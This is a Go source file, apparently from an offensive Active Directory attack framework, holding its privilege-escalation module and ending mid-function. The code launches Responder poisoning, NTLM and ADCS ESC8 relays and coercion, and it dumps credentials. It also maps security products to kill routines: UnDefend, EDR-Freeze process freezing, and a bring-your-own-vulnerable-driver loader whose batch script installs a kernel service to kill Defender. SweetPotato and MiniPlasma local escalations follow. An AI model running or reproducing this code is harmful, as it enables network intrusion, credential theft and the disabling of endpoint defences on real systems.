package modules

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"adpack/core"
	"adpack/internal/bloodhound"
	"adpack/internal/resolver"
	"adpack/internal/resolver/cert"
	"adpack/planner"
	"adpack/tools"
	"adpack/utils"
)

type DeltaClass int

const (
	DeltaNone DeltaClass = iota
	DeltaCredential
	DeltaEdge
	DeltaPath
	DeltaNoise
)

func (d DeltaClass) String() string {
	switch d {
	case DeltaNone:
		return "none"
	case DeltaCredential:
		return "credential"
	case DeltaEdge:
		return "edge"
	case DeltaPath:
		return "path"
	case DeltaNoise:
		return "noise"
	default:
		return fmt.Sprintf("unknown(%d)", int(d))
	}
}

func RunPrivesc(state *core.ADState, targetHost string, evasionProfile string, executePaths bool) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target for privilege escalation checks")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for privesc")
		result.Success = false
		return result
	}

	maxIter := 5
	lpeAttempted := make(map[string]bool)

	for iter := 0; iter < maxIter; iter++ {
		credsBefore := len(state.Creds)
		edgesBefore := len(state.Edges)

		exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()

		// ── Runtime services (Responder + Relay, non-stealth only) ──
		var runtime core.RuntimeProvider
		relayEdges := make(chan core.PrivilegeEdge, 64)
		if RuntimeFactory != nil && !isStealthPolicy(evasionProfile) {
			runtime = RuntimeFactory()

			// Start Responder first (poisoner generates traffic)
			respCfg := core.ResponderConfig{
				ID:        "responder-main",
				Label:     "Responder Poisoner",
				Interface: "eth0",
				Verbose:   true,
				WPAD:      true,
			}
			if err := runtime.StartResponder(ctx, respCfg); err != nil {
				utils.StepWarn(fmt.Sprintf("Failed to start Responder: %v", err))
			} else {
				utils.StepOk("Responder started on eth0 (LLMNR/NBT-NS/WPAD poisoning)")
			}

			// Start relay as receiver
			relayCfg := core.RelayConfig{
				ID:          "ntlmrelayx-main",
				Label:       "NTLM Relay Listener",
				InterfaceIP: "0.0.0.0",
				Target:      "ldap://" + host.IP,
				SMBServer:   true,
				HTTPServer:  true,
			}
			if err := runtime.StartRelay(ctx, relayCfg); err != nil {
				utils.StepWarn(fmt.Sprintf("Failed to start relay: %v", err))
			} else {
				utils.StepOk(fmt.Sprintf("NTLM relay started on 0.0.0.0 → ldap://%s", host.IP))
			}

			// ESC8: secondary relay targeting ADCS HTTP endpoint
			adcsWebURL := detectADCSWebEnrollment(state, host.IP)
			if adcsWebURL != "" {
				esc8Cfg := core.RelayConfig{
					ID:          "ntlmrelayx-esc8",
					Label:       "ESC8 ADCS Relay",
					InterfaceIP: "0.0.0.0",
					Target:      adcsWebURL,
					SMBServer:   false,
					HTTPServer:  false,
					ADCSMode:    true,
				}
				if err := runtime.StartRelay(ctx, esc8Cfg); err != nil {
					utils.StepWarn(fmt.Sprintf("Failed to start ESC8 relay: %v", err))
				} else {
					utils.StepOk(fmt.Sprintf("ESC8 relay started → %s", adcsWebURL))
				}
			}

			// Start coercer to trigger authentications
			coercerTargets := []string{host.IP}
			coercerCfg := core.CoercerConfig{
				ID:          "coercer-main",
				Label:       "Coercer Trigger",
				SourceLabel: host.IP,
				InterfaceIP: "0.0.0.0",
				Targets:     coercerTargets,
				Methods:     []string{},
				Delay:       120 * time.Second,
			}
			if err := runtime.StartCoercer(ctx, coercerCfg); err != nil {
				utils.StepWarn(fmt.Sprintf("Failed to start coercer: %v", err))
			} else {
				utils.StepOk(fmt.Sprintf("Coercer started, targeting %d host(s)", len(coercerTargets)))
			}

			// Stop all services on return
			defer runtime.StopAll()

			// Consume events from all services into edge channel
			go func() {
				for {
					select {
					case evt, ok := <-runtime.Events():
						if !ok {
							return
						}
						if edge := materializeEdgeFromEvent(evt); edge != nil {
							relayEdges <- *edge
						}
					case <-ctx.Done():
						// Drain any remaining events so senders don't block
						for {
							select {
							case _, ok := <-runtime.Events():
								if !ok {
									return
								}
							default:
								return
							}
						}
					}
				}
			}()

			// Attach artifact resolver pipeline (certipy → identity extraction)
			resolvers := []resolver.ArtifactResolver{&cert.CertResolver{}}
			resolver.AttachResolverPipeline(ctx, runtime, state, resolvers...)
		}

		ldapHost := host.IP
		if dc := findDC(state, domain); dc.IP != "" {
			ldapHost = dc.IP
		}

		// ── LDAP checks ──────────────────────────────────────────
		provider := NewNetExecProvider(core.ProviderConfig{
			Host: ldapHost, Domain: domain,
			Username: user, Password: pass, Hash: hash,
		})
		mssqlProvider := NewNetExecProvider(core.ProviderConfig{
			Host: host.IP, Domain: domain,
			Username: user, Password: pass, Hash: hash,
		})

		// GPP passwords (quick nxc module check)
		utils.Step("Checking GPP passwords in SYSVOL...")
		gppR := exec.Execute(ctx, core.Action{
			Target: core.HostRef{Name: ldapHost, Domain: domain},
			Method: "ldap", Artifact: "-M", Arguments: []string{"gpp_password"},
			Timeout: 30 * time.Second,
		})
		if gppR.Success {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
				Source: "gpp_password", Key: "status",
				Value: "GPP check complete", RawOutput: gppR.Output,
				Timestamp: time.Now(),
			})
		}

		// ADCS vulnerable template enumeration
		utils.Step("Checking ADCS vulnerable templates...")
		adcsR := exec.Execute(ctx, core.Action{
			Target: core.HostRef{Name: ldapHost, Domain: domain},
			Method: "ldap", Artifact: "-M", Arguments: []string{"adcs"},
			Timeout: 30 * time.Second,
		})
		if adcsR.Success {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
				Source: "adcs", Key: "status",
				Value: "ADCS check complete", RawOutput: adcsR.Output,
				Timestamp: time.Now(),
			})
		}

		// RBCD check
		utils.Step("Checking RBCD...")
		rbcdR := exec.Execute(ctx, core.Action{
			Target: core.HostRef{Name: ldapHost, Domain: domain},
			Method: "ldap", Artifact: "-M", Arguments: []string{"rbcd"},
			Timeout: 30 * time.Second,
		})
		if rbcdR.Success {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
				Source: "rbcd", Key: "status",
				Value: "RBCD check complete", RawOutput: rbcdR.Output,
				Timestamp: time.Now(),
			})
		}

		// ── ACL enumeration via daclread ──────────────────────────
		utils.Step("Enumerating ACL privilege edges (daclread)...")
		targets := highValueTargets(state)
		if len(targets) == 0 {
			// Fall back to common targets if state is sparse
			targets = []string{"Domain Admins", "Administrators", "Domain Controllers"}
		}

		edgeCount := 0
		for _, t := range targets {
			edges, err := provider.EnumerateACLs(ctx, t)
			if err != nil {
				utils.StepWarn(fmt.Sprintf("daclread failed for %s: %v", t, err))
				continue
			}
			edges = dedupEdges(edges, state.Edges)
			if len(edges) > 0 {
				state.Edges = append(state.Edges, edges...)
				edgeCount += len(edges)
				utils.StepOk(fmt.Sprintf("%d ACE(s) found on %s", len(edges), t))
				for _, e := range edges {
					utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
					result.Evidence = append(result.Evidence, core.EvidenceEntry{
						Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
						Source: "daclread", Key: e.SourcePrincipal,
						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
						Confidence: e.Confidence, Timestamp: time.Now(),
					})
				}
			}
		}

		// ── MSSQL impersonation edges ───────────────────────────
		utils.Step("Checking MSSQL impersonation privileges (mssql_priv)...")
		mssqlEdges, err := mssqlProvider.EnumerateMSSQLImpersonations(ctx)
		if err != nil {
			utils.StepWarn(fmt.Sprintf("mssql_priv failed: %v", err))
		} else if len(mssqlEdges) > 0 {
			mssqlEdges = dedupEdges(mssqlEdges, state.Edges)
			if len(mssqlEdges) == 0 {
				utils.StepInfo("No new MSSQL impersonation edges found")
			} else {
				state.Edges = append(state.Edges, mssqlEdges...)
				edgeCount += len(mssqlEdges)
				utils.StepOk(fmt.Sprintf("%d MSSQL privilege edge(s) found", len(mssqlEdges)))
				for _, e := range mssqlEdges {
					utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
					result.Evidence = append(result.Evidence, core.EvidenceEntry{
						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
						Source: "mssql_priv", Key: e.SourcePrincipal,
						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
						Confidence: e.Confidence, Timestamp: time.Now(),
					})
				}
			}
		} else {
			utils.StepInfo("No MSSQL impersonation edges found")
		}

		// ── MSSQL linked server edges ──────────────────────────
		utils.Step("Checking MSSQL linked servers...")
		linkedEdges, err := mssqlProvider.EnumerateMSSQLLinkedServers(ctx)
		if err != nil {
			utils.StepWarn(fmt.Sprintf("MSSQL linked server enumeration failed: %v", err))
		} else if len(linkedEdges) > 0 {
			linkedEdges = dedupEdges(linkedEdges, state.Edges)
			if len(linkedEdges) > 0 {
				state.Edges = append(state.Edges, linkedEdges...)
				edgeCount += len(linkedEdges)
				utils.StepOk(fmt.Sprintf("%d MSSQL linked server(s) found", len(linkedEdges)))
				for _, e := range linkedEdges {
					utils.Finding(e.SourcePrincipal, e.AccessRight)
					result.Evidence = append(result.Evidence, core.EvidenceEntry{
						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
						Source: "mssql_linked", Key: e.SourcePrincipal,
						Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
						Confidence: e.Confidence, Timestamp: time.Now(),
					})
				}
			}
		} else {
			utils.StepInfo("No MSSQL linked servers found")
		}

		// ── ADCS certificate template edges ──────────────────────
		utils.Step("Enumerating ADCS certificate templates (certipy-find)...")
		adcsTemplates, err := provider.EnumerateADCSTemplates(ctx)
		if err != nil {
			utils.StepWarn(fmt.Sprintf("certipy-find failed: %v", err))
		} else if len(adcsTemplates) > 0 {
			utils.StepOk(fmt.Sprintf("%d ADCS template(s) found", len(adcsTemplates)))
			for _, t := range adcsTemplates {
				if t.Vuln == "" {
					continue
				}
				adcsEdges := adcsEdgeSet(t, domain, host.IP, false)
				adcsEdges = dedupEdges(adcsEdges, state.Edges)
				state.Edges = append(state.Edges, adcsEdges...)
				edgeCount += len(adcsEdges)
				if len(adcsEdges) > 0 {
					utils.Finding(fmt.Sprintf("%s [%s]", t.Name, t.Vuln), fmt.Sprintf("%d edge(s)", len(adcsEdges)))
					for _, e := range adcsEdges {
						utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
						result.Evidence = append(result.Evidence, core.EvidenceEntry{
							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
							Source: "certipy-find", Key: e.SourcePrincipal,
							Value:      fmt.Sprintf("%s → %s [%s]", e.AccessRight, e.TargetPrincipal, t.Name),
							Confidence: e.Confidence, Timestamp: time.Now(),
						})
					}
				}
			}
		} else {
			utils.StepInfo("No ADCS templates found")
		}

		// ── Relay capture edges ───────────────────────────────────
		if runtime != nil {
			drained := drainRelayEdges(relayEdges)
			if len(drained) > 0 {
				drained = dedupEdges(drained, state.Edges)
				if len(drained) > 0 {
					state.Edges = append(state.Edges, drained...)
					edgeCount += len(drained)
					utils.StepOk(fmt.Sprintf("%d new relay capture edge(s) materialized", len(drained)))
					for _, e := range drained {
						utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
						result.Evidence = append(result.Evidence, core.EvidenceEntry{
							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
							Source: "ntlmrelayx", Key: e.SourcePrincipal,
							Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
							Confidence: e.Confidence, Timestamp: time.Now(),
						})
					}
				}
			}
			runtime.ApplyToState(state)
		}

		// ── Delegation edges (unconstrained, constrained, RBCD) ──
		utils.Step("Enumerating delegation relationships...")
		delegEdges, err := provider.EnumerateDelegation(ctx)
		if err != nil {
			utils.StepWarn(fmt.Sprintf("Delegation enumeration failed: %v", err))
		} else if len(delegEdges) > 0 {
			delegEdges = dedupEdges(delegEdges, state.Edges)
			if len(delegEdges) == 0 {
				utils.StepInfo("No new delegation relationships found")
			} else {
				state.Edges = append(state.Edges, delegEdges...)
				edgeCount += len(delegEdges)
				utils.StepOk(fmt.Sprintf("%d delegation edge(s) found", len(delegEdges)))
				for _, e := range delegEdges {
					utils.Finding(e.SourcePrincipal, fmt.Sprintf("%s [%s]", e.TargetPrincipal, e.AccessRight))
					result.Evidence = append(result.Evidence, core.EvidenceEntry{
						Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
						Source: "delegation", Key: e.SourcePrincipal,
						Value:      fmt.Sprintf("%s → %s [%s]", e.SourcePrincipal, e.TargetPrincipal, e.AccessRight),
						Confidence: e.Confidence, Timestamp: time.Now(),
					})
				}
			}
		} else {
			utils.StepInfo("No delegation relationships found")
		}

		// ── BloodHound graph enrichment ────────────────────────────
		utils.Step("Enumerating BloodHound graph (bloodhound-python)...")
		bhDir, bhErr := os.MkdirTemp("", "adpack-bh-*")
		if bhErr == nil {
			defer os.RemoveAll(bhDir)
			bhDCIP := host.IP
			bhDCHost := ""
			if dc := findDC(state, domain); dc.IP != "" {
				bhDCIP = dc.IP
				if dc.Hostname != "" {
					bhDCHost = dc.Hostname + "." + domain
				}
			}
			bhCfg := bloodhound.CollectConfig{
				Domain:    domain,
				Username:  user,
				Password:  pass,
				Hash:      hash,
				DCHost:    bhDCHost,
				DNSHost:   bhDCIP,
				OutputDir: bhDir,
				Methods:   bloodhound.DefaultMethods,
			}
			if bhErr = bloodhound.CollectAndIngest(ctx, bhCfg, state); bhErr != nil {
				utils.StepWarn(fmt.Sprintf("BloodHound ingestion failed: %v", bhErr))
			} else {
				bhCount := len(state.Edges)
				bhTotal := 0
				for _, e := range state.Edges {
					if e.Source == "bloodhound" {
						bhTotal++
					}
				}
				utils.StepOk(fmt.Sprintf("BloodHound merged: %d users, %d groups, %d computers, %d BH edges (total %d edges)",
					len(state.Users), len(state.Groups), len(state.Computers), bhTotal, bhCount))
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvUserEnumerated, Phase: core.PhasePrivEsc,
					Source: "bloodhound", Key: "ingested",
					Value:     fmt.Sprintf("%d edges merged", bhTotal),
					Timestamp: time.Now(),
				})
			}
		} else {
			utils.StepWarn(fmt.Sprintf("Cannot create temp dir for BloodHound: %v", bhErr))
		}

		// ── Weighted path planning (baseline) ──────────────────────
		availCaps := getAvailableCaps()
		if runtime != nil {
			health := runtimeHealthSummary(runtime)
			utils.StepInfo(fmt.Sprintf("Runtime: %s", health))
		}
		baselinePlans := runPlanning(state, result, availCaps)
		latestPlans := baselinePlans

		// ── SUB-PHASE 1: SYSTEM check + credential dump ──────────
		gotSystem := doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "system_check")

		// ── SUB-PHASE 2: AV kill + deep credential dump ──────
		// Disable Defender via UnDefend, then cascade through available dump tools.
		if gotSystem {
			runUnDefendKill(ctx, state, host, exec, domain, user, pass, result)
			runDeepCredDump(ctx, state, host, exec, domain, user, pass, result)
		}

		// ── SUB-PHASE 3: GPO abuse (edit Settings on GPO to run as SYSTEM) ──
		if !gotSystem {
			runGPOAbuse(ctx, state, host, exec, domain, user, pass, result)
		}

		// ── SUB-PHASE 4: Re-check SYSTEM (GPO abuse may have elevated us) ─
		if !gotSystem {
			gotSystem = doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "gpo_abuse")
		}

		// ── SUB-PHASE 5: Local LPE chain (supplementary) ──────
		if !gotSystem {
			runLocalLPEChain(ctx, state, host, exec, lpeAttempted, result)
		}

		// ── SUB-PHASE 6: Final SYSTEM re-check after LPE ──────
		if !gotSystem {
			doSystemCheckAndDump(ctx, state, host, exec, domain, user, pass, result, "local_lpe")
		}

		// ── SUB-PHASE 7: Child-to-parent domain escalation ────
		runChildToParentEscalation(state, result)

		// ── Runtime edge drain + replanning ───────────────────────
		if cap(relayEdges) > 0 {
			drained := drainRelayEdges(relayEdges)
			if len(drained) > 0 {
				drained = dedupEdges(drained, state.Edges)
				if len(drained) > 0 {
					state.Edges = append(state.Edges, drained...)
					edgeCount += len(drained)
					utils.StepOk(fmt.Sprintf("%d new runtime capture edge(s) materialized during execution", len(drained)))
					for _, e := range drained {
						utils.EdgeDisplay(e.SourcePrincipal, e.AccessRight, e.TargetPrincipal, e.Exploitability, e.Noise)
						result.Evidence = append(result.Evidence, core.EvidenceEntry{
							Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
							Source: "runtime", Key: e.SourcePrincipal,
							Value:      fmt.Sprintf("%s → %s", e.AccessRight, e.TargetPrincipal),
							Confidence: e.Confidence, Timestamp: time.Now(),
						})
					}
				}
			}
			if runtime != nil {
				runtime.ApplyToState(state)
				health := runtimeHealthSummary(runtime)
				fmt.Printf("[*] Runtime post-execution: %s\n", health)
			}
		}

		// Replan if new edges were added
		if len(state.Edges) > 0 {
			newPlans := runPlanning(state, result, availCaps)
			latestPlans = newPlans
			if len(newPlans) > 0 && len(baselinePlans) > 0 {
				for target, plan := range newPlans {
					if old, ok := baselinePlans[target]; !ok || plan.TotalCost < old.TotalCost {
						fmt.Printf("  ⤴ Better path to %s: score %.1f (was %.1f)\n",
							target, plan.TotalCost, old.TotalCost)
					}
				}
			}
		}

		// ── Optional path execution ────────────────────────────
		if executePaths && len(latestPlans) > 0 {
			fmt.Println("\n[*] Executing best planned paths (reconciliation-gated)...")
			ctx2, cancel2 := context.WithCancel(context.Background())
			defer cancel2()
			executed := ExecuteBestPaths(ctx2, state, latestPlans, host.IP, result)
			if executed > 0 {
				fmt.Printf("[+] Path execution: %d steps completed\n", executed)
			}
		}

		// ── Edge confidence health summary ─────────────────────
		printConfidenceHealth(state.Edges)

		// ── Active re-verification of stale/degraded edges ────
		if executePaths {
			domain, user, pass, _ := getCredential(state)
			if domain != "" && user != "" {
				reVerified := ReVerifyEdges(ctx, state, domain, user, pass, host.IP, 5)
				if reVerified > 0 {
					fmt.Printf("[+] Re-verified %d stale/degraded edges against live AD\n", reVerified)
				}
			}
		}

		delta := classifyDelta(credsBefore, edgesBefore, state)
		fmt.Printf("[*] Privesc iteration %d/%d complete: delta=%s\n", iter+1, maxIter, delta)

		switch delta {
		case DeltaNone, DeltaNoise:
			return result
		case DeltaCredential:
			if hasValidatedDA(state) {
				return result
			}
		}
	}

	return result
}

// ── SUB-PHASE 1: Pre-Evasion ───────────────────────────────

var avPipelineMap = map[string]string{
	"windows defender":   "undefend",
	"defender":           "undefend",
	"sentinelone":        "phantomkiller",
	"sentinel one":       "phantomkiller",
	"crowdstrike":        "phantomkiller",
	"cylance":            "phantomkiller",
	"carbon black":       "coldwer",
	"carbonblack":        "coldwer",
	"sophos":             "coldwer",
	"tanium":             "phantomkiller",
	"microsoft defender": "undefend",
}

func selectAVPipeline(detected map[string]string) string {
	for av := range detected {
		avLower := strings.ToLower(av)
		for pattern, pipeline := range avPipelineMap {
			if strings.Contains(avLower, pattern) {
				return pipeline
			}
		}
	}
	return ""
}

// runUnDefendKill deploys UnDefend.exe and runs --kill to disable Defender.
// Requires admin/SYSTEM on target. Safe to run even if Defender isn't present.
func runUnDefendKill(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, domain, user, pass string, result *core.ToolResult) {

	if !tools.UnDefend.Available() {
		utils.StepWarn("UnDefend.exe not found, skipping AV kill")
		return
	}

	utils.Step("Deploying UnDefend.exe --kill to disable Defender...")

	remoteDir := `C:\Windows\Temp\`
	deployR := exec.Execute(ctx, core.Action{
		Artifact: "UnDefend.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !deployR.Success {
		utils.StepWarn(fmt.Sprintf("UnDefend deploy failed: %s", deployR.Error))
		return
	}
	remotePath := deployR.Output

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass,
	}
	cr, err := tools.UnDefend.ExecRemote(ctx, target, remotePath, true)
	if err != nil || !cr.Success {
		utils.StepWarn(fmt.Sprintf("UnDefend --kill failed: %v", err))
	} else {
		utils.StepOk("UnDefend --kill executed (Defender disabled)")
	}

	exec.Execute(ctx, core.Action{
		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
	})

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "undefend", Key: host.IP, Value: "Defender killed via UnDefend --kill",
		Confidence: 0.85, Timestamp: time.Now(),
	})

	fmt.Println("[*] Waiting 8s for Defender termination...")
	time.Sleep(8 * time.Second)
}

func runPreEvasion(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	killTarget := host
	for _, h := range state.Hosts {
		if !h.IsDC {
			killTarget = h
			break
		}
	}

	// Check what AV/EDR is actually running on the target
	domain, user, pass, hash := getCredential(state)
	if domain != "" && user != "" {
		provider := NewNetExecProvider(core.ProviderConfig{
			Host: killTarget.IP, Domain: domain,
			Username: user, Password: pass, Hash: hash,
		})
		av, err := provider.EnumerateAV(ctx)
		if err == nil && len(av) > 0 {
			var names []string
			for name := range av {
				names = append(names, name)
			}
			avStr := strings.Join(names, ", ")
			fmt.Printf("[*] Detected EDR/AV on %s: %s\n", killTarget.IP, avStr)

			// Update host EDR field in state
			for i := range state.Hosts {
				if state.Hosts[i].IP == killTarget.IP {
					state.Hosts[i].EDR = avStr
					break
				}
			}

			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
				Source: "enum_av", Key: killTarget.IP,
				Value: avStr, Confidence: 0.9, Timestamp: time.Now(),
			})

			// Select evasion pipeline based on what's detected
			pipeline := selectAVPipeline(av)
			switch pipeline {
			case "undefend":
				fmt.Printf("[*] Targeting %s with UnDefend pipeline\n", avStr)
				runUnDefendDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
			case "phantomkiller":
				if tools.PhantomKiller.Available() {
					fmt.Printf("[*] Targeting %s with PhantomKiller pipeline\n", avStr)
					runPhantomKiller(ctx, killTarget, exec, result)
				} else {
					fmt.Println("[!] PhantomKiller not available, trying UnDefend fallback")
					runUnDefendDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
				}
			case "coldwer":
				fmt.Printf("[*] Targeting %s with ColdWer pipeline\n", avStr)
				runColdWerDirect(ctx, killTarget, domain, user, pass, hash, exec, result)
			default:
				fmt.Printf("[*] No specific pipeline for %s, trying PhantomKiller (best-effort)\n", avStr)
				if tools.PhantomKiller.Available() {
					runPhantomKiller(ctx, killTarget, exec, result)
				}
			}
		} else {
			fmt.Printf("[*] No AV/EDR detected on %s (or enum failed), skipping pre-evasion\n", killTarget.IP)
		}
	} else {
		fmt.Println("[!] No credentials for AV enumeration, running blind")
		if tools.PhantomKiller.Available() {
			runPhantomKiller(ctx, host, exec, result)
		}
	}

	fmt.Println("[*] Waiting 10s for EDR termination...")
	time.Sleep(10 * time.Second)
}

// runUnDefendDirect deploys UnDefend + nanodump against a specific target
func runUnDefendDirect(ctx context.Context, host core.Host, domain, user, pass, hash string, exec core.Executor, result *core.ToolResult) {
	if !tools.UnDefend.Available() {
		fmt.Println("[!] UnDefend.exe not found, skipping")
		return
	}

	remoteDir := `C:\Windows\Temp\`
	deployR := exec.Execute(ctx, core.Action{
		Artifact: "UnDefend.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !deployR.Success {
		fmt.Printf("[!] UnDefend deploy failed: %s\n", deployR.Error)
		return
	}
	remotePath := deployR.Output

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}
	tools.UnDefend.ExecRemote(ctx, target, remotePath, true)

	exec.Execute(ctx, core.Action{
		Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
	})

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "undefend", Key: host.IP, Value: "Defender killed (AV-guided)",
		Confidence: 0.85, Timestamp: time.Now(),
	})
}

// runColdWerDirect deploys EDR-Freeze + nanodump against a specific target
func runColdWerDirect(ctx context.Context, host core.Host, domain, user, pass, hash string, exec core.Executor, result *core.ToolResult) {
	remoteDir := `C:\Windows\Temp\`
	freezerR := exec.Execute(ctx, core.Action{
		Artifact: "EDR-Freeze.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !freezerR.Success {
		fmt.Println("[!] EDR-Freeze deploy failed, skipping")
		return
	}
	freezerPath := freezerR.Output

	edrProcs := []string{"MsMpEng.exe", "SentinelAgent.exe", "CrowdStrike.exe",
		"Sophos.exe", "TaniumClient.exe", "CarbonBlack.exe"}
	for _, proc := range edrProcs {
		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
		pidR := exec.Execute(ctx, core.Action{
			Artifact: pidCmd, Method: "command", Timeout: 15 * time.Second,
		})
		if pidR.Success && strings.TrimSpace(pidR.Output) != "" {
			pid := strings.TrimSpace(pidR.Output)
			freezeCmd := fmt.Sprintf(`%s %s 3000`, freezerPath, pid)
			exec.Execute(ctx, core.Action{
				Artifact: freezeCmd, Method: "command", Timeout: 15 * time.Second,
			})
			fmt.Printf("[*] ColdWer: Froze %s PID %s for 3s\n", proc, pid)
			break
		}
	}

	exec.Execute(ctx, core.Action{
		Method: "cleanup", Arguments: []string{freezerPath}, Timeout: 15 * time.Second,
	})

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
		Source: "coldwer", Key: host.IP, Value: "EDR freeze attempted (AV-guided)",
		Confidence: 0.75, Timestamp: time.Now(),
	})
}

func runPhantomKiller(ctx context.Context, host core.Host,
	exec core.Executor, result *core.ToolResult) {

	domain := host.Domain
	remoteDir := `C:\Windows\Temp\`
	var cleanups []string
	defer func() {
		if len(cleanups) > 0 {
			exec.Execute(ctx, core.Action{
				Method: "cleanup", Arguments: cleanups, Timeout: 30 * time.Second,
			})
		}
	}()

	batPath := deployAndExecPhantomKiller(ctx, exec, host, domain, remoteDir, &cleanups)
	if batPath == "" {
		return
	}

	execR := exec.Execute(ctx, core.Action{
		Artifact: batPath, Method: "command",
		Timeout: 60 * time.Second,
	})
	if execR.Success {
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
			Source: "phantomkiller", Key: host.IP, Value: "EDR terminated (BYOVD)",
			Confidence: 0.85, RawOutput: execR.Output, Timestamp: time.Now(),
		})
		fmt.Printf("[+] PhantomKiller: EDR kill attempted successfully on %s\n", host.IP)
	}
}

func deployAndExecPhantomKiller(ctx context.Context, exec core.Executor, host core.Host, domain, remoteDir string, cleanups *[]string) string {
	drvR := exec.Execute(ctx, core.Action{
		Artifact: "PhantomKiller.sys", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !drvR.Success {
		return ""
	}
	driverPath := drvR.Output
	*cleanups = append(*cleanups, driverPath)

	loaderR := exec.Execute(ctx, core.Action{
		Artifact: "PhantomKiller.exe", Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !loaderR.Success {
		return ""
	}
	loaderPath := loaderR.Output
	*cleanups = append(*cleanups, loaderPath)

	driverName := "PK_" + tools.RandString(4)
	batContent := fmt.Sprintf(
		`@echo off
setlocal enabledelayedexpansion
for /f "tokens=2 delims= " %%p in ('tasklist /fi "imagename eq MsMpEng.exe" /nh') do set PID=%%p
if "!PID!"=="" echo No Defender PID found && exit /b 0
sc.exe create %s binPath="%s" type=kernel
sc.exe start %s
%s !PID!
`, driverName, driverPath, driverName, loaderPath)

	batLocal := filepath.Join(os.TempDir(), "pk_"+tools.RandString(4)+".bat")
	if err := os.WriteFile(batLocal, []byte(batContent), 0644); err != nil {
		fmt.Printf("[!] PhantomKiller: failed to write batch file: %v\n", err)
		return ""
	}
	defer os.Remove(batLocal)

	batR := exec.Execute(ctx, core.Action{
		Artifact: batLocal, Method: "put",
		Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
	})
	if !batR.Success {
		return ""
	}
	batPath := batR.Output
	*cleanups = append(*cleanups, batPath)

	fmt.Printf("[*] PhantomKiller: loading driver and killing Defender on %s...\n", host.IP)
	return batPath
}

// ── SUB-PHASE 3: Local LPE ─────────────────────────────────

func runLocalLPEChain(ctx context.Context, state *core.ADState, host core.Host,
	exec core.Executor, lpeAttempted map[string]bool, result *core.ToolResult) {

	if lpeAttempted[host.IP] {
		return
	}
	lpeAttempted[host.IP] = true

	// SweetPotato: reliable NETWORK SERVICE → SYSTEM via SeImpersonate
	domain, user, pass, _ := getCredential(state)
	runSweetPotatoProbe(ctx, host, exec, domain, user, pass, result)

	// MiniPlasma: Cloud Filter EoP (supplementary)
	if !hasSystemEvidence(result) && tools.MiniPlasma.Available() {
		runMiniPlasmaProbe(ctx, host, exec, result)
	}
}

func hasSystemEvidence(result *core.ToolResult) bool {
	for _, ev := range result.Evidence {
		if ev.Type == core.EvPrivEscalated && strings.Contains(ev.Value, "SYSTEM") {
			return true
		}
	}
	return false
}

func runGPOAbuse(ctx context.Context, state *core.ADState, host core.Host,
